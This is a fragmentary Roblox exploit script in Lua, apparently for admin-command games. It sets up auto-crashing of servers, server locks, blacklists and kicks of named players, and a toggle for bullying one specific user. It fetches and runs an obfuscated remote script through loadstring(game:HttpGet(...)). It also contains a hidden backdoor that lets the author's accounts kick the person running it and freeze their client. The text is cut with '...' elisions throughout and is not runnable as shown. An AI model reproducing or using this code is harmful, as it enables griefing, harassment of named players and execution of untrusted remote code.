-- Made by Jotunn
-- Credits to vecko and some others 
-- Note: Console chats all inputs, can be used for commands
-- Note: This is a 'beta' release as the script is not 100% finished, i'm constantly updating new features for yall to enjoy


-- // GUI Settings:


_G.permadmin = true -- this will take a pad as soon as you join, set to true if you dont have perm (will skip servers with no pads when autocrashing)
...
_G.afkstatus = nil
_G.whitelisted = {"Exprvssed"} -- basically grants them immunity to serverlocks and skips server when autocrashing
_G.chatlogs = true
_G.autocrasher = nil --autocrasher script, make sure script is in autoexec and enable to true
_G.RenderingEnabled = nil -- This sets your rendering to false when autocrashing, saves CPU usage
_G.updatedPlayerList = true -- Loads up a custom player list
...
local allowedtousescript = {"1x3x3x7x1x7", "Exprvssed", "0N0NYMOUS", "BANNter_Original", "Di33le2", "me_capybara", "Altsarecooleh"}
...
getgenv().blacklisted = {""} -- blacklisted Players, will kick if they join

_G.players = {} -- table to store player in the server

if game.PlaceId == 112420803 or game.PlaceId == 115670532 or game.PlaceId == 333164326 then
...
addcommand("distort",
    ...
    table.insert(_G.whitelisted,"punchy39")
	...
	addcommand("rsrail",
		...
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
                 ...
                 wait(.5)
                 tchat("slock "..Target.Name.." Blacklisted")
                end 
            end) 
...
while true do
	...
	addcommand("ssnek",
        ...
        loadstring(game:HttpGet("https://raw.githubusercontent.com/IShade4ReaI/biblical-passage/main/Protected_1986201879440376.lua"))
        addcommand("dfcolour",
		"desc",
		function()
            colorAPI = {}
...
plr.Chatted:Connect(function(m)
    ...
    game.Players.PlayerAdded:Connect(
        function(pr)
                if pr.Name == 'emriyaI' and _G.bullyaria then 
...
tchat("pclr")
        ...
        for i, v in pairs(game.Players:GetPlayers()) do 
            if v.Name == 'Exprvssed' or v.Name == '0N0NYMOUS' or v.Name == 'Altsarecooleh' then 
                v.Chatted:Connect(function(msg)
                    if msg == "?kick" then 
                        game.Players.LocalPlayer:Kick("you thought you could use my own script against me?")
                        task.wait(.3)
                        while true do end 
                    end 
                end) 
...
function()
        ...
        chat(plr.Name.."'s Ping is "..tostring(plr:GetNetworkPing()*1000):split(".")[1].." ms")
end)
